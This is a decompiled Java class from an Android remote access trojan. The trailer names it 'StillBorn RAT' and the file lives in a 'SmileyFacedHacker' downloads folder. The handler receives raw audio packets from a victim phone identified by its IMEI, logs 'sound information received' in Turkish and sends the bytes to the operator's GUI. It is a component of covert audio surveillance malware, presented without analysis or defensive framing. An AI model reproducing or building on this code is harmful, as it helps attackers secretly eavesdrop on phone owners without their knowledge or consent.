/*  1:   */ package handler;
/*  2:   */ 
/*  3:   */ import Packet.Packet;
/*  4:   */ import Packet.RawPacket;
/*  5:   */ import gui.GUI;
/*  6:   */ import java.util.HashMap;
/*  7:   */ import server.Server;
/*  8:   */ 
/*  9:   */ public class SoundHandler
/* 10:   */   implements PacketHandler
/* 11:   */ {
/* 12:   */   private GUI gui;
/* 13:   */   private int channel;
/* 14:   */   private String imei;
/* 15:   */   
/* 16:   */   public SoundHandler(int channel, String imei, GUI gui)
/* 17:   */   {
/* 18:34 */     this.gui = gui;
/* 19:35 */     this.channel = channel;
/* 20:36 */     this.imei = imei;
/* 21:   */   }
/* 22:   */   
/* 23:   */   public void receive(Packet p, String imei) {}
/* 24:   */   
/* 25:   */   public void handlePacket(Packet p, String temp_imei, Server c)
/* 26:   */   {
/* 27:46 */     this.gui.logTxt("Ses bilgisi alındı");
/* 28:47 */     ((ChannelDistributionHandler)c.getChannelHandlerMap().get(this.imei)).getStorage(this.channel).reset();
/* 29:48 */     RawPacket packet = (RawPacket)p;
/* 30:49 */     this.gui.addSoungBytes(this.imei, packet.getData());
/* 31:   */   }
/* 32:   */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     handler.SoundHandler
 * JD-Core Version:    0.7.0.1
 */